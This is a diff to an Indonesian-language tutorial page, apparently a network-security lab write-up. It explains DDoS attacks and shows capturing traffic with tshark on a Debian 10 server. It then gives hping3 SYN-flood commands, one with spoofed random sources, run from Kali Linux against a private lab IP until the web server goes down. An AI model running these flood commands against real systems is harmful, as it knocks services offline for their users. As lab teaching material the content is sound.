@@ -257,6 +257,57 @@ password : rizwanpemula
 
 *result of username & password database from client
 <img src="../img/arp-http.png" alt="" class="img-top"></pre>
+
+        <hr />
+        <div class="gambar">
+          <img src="../img/top-ddos.jpg" alt="" class="img-xl" />
+        </div>
+        <h3>Introduction</h3>
+        <p>
+          DDOS attack atau Distributed Denial of Service merupakan serangan cyber dengan cara mengirimkan fake traffic atau lalu lintas palsu ke suatu sistem atau server secara terus menerus. Dampaknya, server tersebut tidak dapat mengatur
+          seluruh traffic sehingga menyebabkan down.
+        </p>
+        <p>
+          Umumnya serangan ini menyasar jaringan, layanan online, hingga website, dengan tujuan agar server tersebut tidak dapat mengakomodasi traffic atau lalu lintas sehingga website mengalami down dan tidak dapat beroperasi. Tak hanya
+          menargetkan perseorangan atau perusahaan tertentu, serangan ini juga bisa menyasar sektor lebih tinggi seperti sektor pemerintahan.
+        </p>
+        <p>
+          Dalam prakteknya agar dapat menyerang suatu server, DDOS akan mengerahkan host dalam jumlah besar. Namun host yang dikerahkan tersebut adalah palsu, selanjutnya para hacker akan membanjiri lalu lintas server dengan host palsu
+          tersebut. Sehingga ketika server berhasil dibanjiri oleh traffic hacker, dampaknya server akan lebih sulit diakses oleh host atau pengguna nyata.
+        </p>
+
+        <hr />
+        <h2>Trying to Attack the Client With DDOS</h2>
+        <h3>Debian 10- Server</h3>
+        <p>Kali ini kita ganti Interfaces Network untuk Debian 10- Server menjadi NAT atau Bridge. Ini artinya dia akan mendapatkan IP Internet yang satu segment dengan Router, yaitu : 192.168.91.0/24</p>
+        <h4>Install Package</h4>
+        <p>
+          TShark adalah penganalisa protokol jaringan. Ini memungkinkan Anda menangkap paket data dari jaringan langsung, atau baca paket dari yang sebelumnya disimpan file capture, baik mencetak bentuk decoded dari paket-paket itu ke
+          output standar atau menulis paket ke file. TShark'asli format file tangkap adalah pcapng format, yang juga merupakan format yang digunakan oleh Wireshark dan berbagai alat lainnya.
+        </p>
+        <p>
+          Tanpa set opsi apa pun, TShark akan bekerja seperti tcpdump. Itu akan menggunakan pcap library untuk menangkap lalu lintas dari yang pertama tersedia antarmuka jaringan dan menampilkan garis ringkasan pada output standar untuk
+          setiap paket yang diterima.
+        </p>
+
+        <pre class="important">
+apt install tshark
+
+*non super user be able capture paket ? no</pre
+        >
+        <h4>Run tshark</h4>
+        <pre class="important">tshark</pre>
+        <h3>KaliLinux</h3>
+        <h4>Attack With DDOS</h4>
+        <pre class="important">
+*hping3 -S --flood -V -p 80 (IP Debian 10- Server)
+hping3 -S --flood -V -p 80 192.168.91.130
+        </pre>
+        <pre class="important">
+*hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source (IP Debian 10- Server)
+hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.91.130
+        </pre>
+        <p>Lalu kita tunggu saja hingga Service Web Server dari Debian 10- Server itu down</p>
       </div>
       <!-- Article End -->
 
